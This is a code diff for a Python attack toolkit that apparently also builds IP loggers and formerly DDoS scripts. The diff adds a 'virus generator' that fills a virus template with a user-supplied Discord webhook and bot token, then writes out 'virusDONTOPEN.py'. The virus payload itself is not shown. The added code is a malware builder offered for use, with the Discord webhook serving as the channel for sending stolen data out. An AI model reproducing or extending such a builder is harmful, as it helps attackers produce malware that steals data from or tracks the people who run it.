@@ -9,8 +9,8 @@ from colorama import Fore, Style, init
 init(autoreset=True)
 
 TEMPLATE_FILE = "template.py"
-DDOS_TEMP = "ddos_template.py"
-DDOS_OUTPUT = "ddos.py"
+VIRUS_TEMP = "virus.py"
+VIRUS_OUTPUT = "virusDONTOPEN.py"
 OUTPUT_FILE = "iplogger.py"
 BLUE = "\033[94m"
 RESET = "\033[0m"
@@ -123,6 +123,32 @@ def build_exe(script_path: str) -> Optional[str]:
 
 def virus_generator():
     print("Virus Generator")
+    if not os.path.exists(VIRUS_TEMP):
+        print(f"Template file '{VIRUS_TEMP}' not found.")
+        return
+
+    user_value = input(
+        "whats the discord webhook? (go to discord make a new server then go to server settings then go to integrations then go to create webhook then copy webhook link then paste it here): "
+    ).strip()
+
+    with open(VIRUS_TEMP, "r", encoding="utf-8") as f:
+        content = f.read()
+
+    # Replace only the value inside WEBHOOK_URL = "..."
+    pattern = r'WEBHOOK_URL\s*=\s*".*?"'
+    replacement = f'WEBHOOK_URL = "{user_value}"'
+    new_content = re.sub(pattern, replacement, content)
+
+    token_value = input("whats the token? (go to discord go to user settings then go to advanced then turn on developer mode then search up discord developer dashboard and create a new application then copy the token and paste it here): ").strip()
+    token_pattern = r'TOKEN\s*=\s*".*?"'
+    token_replacement = f'TOKEN = "{token_value}"'
+    token_new_content = re.sub(token_pattern, token_replacement, new_content)
+
+    with open(VIRUS_OUTPUT, "w", encoding="utf-8") as f:
+        f.write(token_new_content)
+
+    print(f"Virus file created at: {VIRUS_OUTPUT}")
+
 
 def file_generation():
     if not os.path.exists(TEMPLATE_FILE):
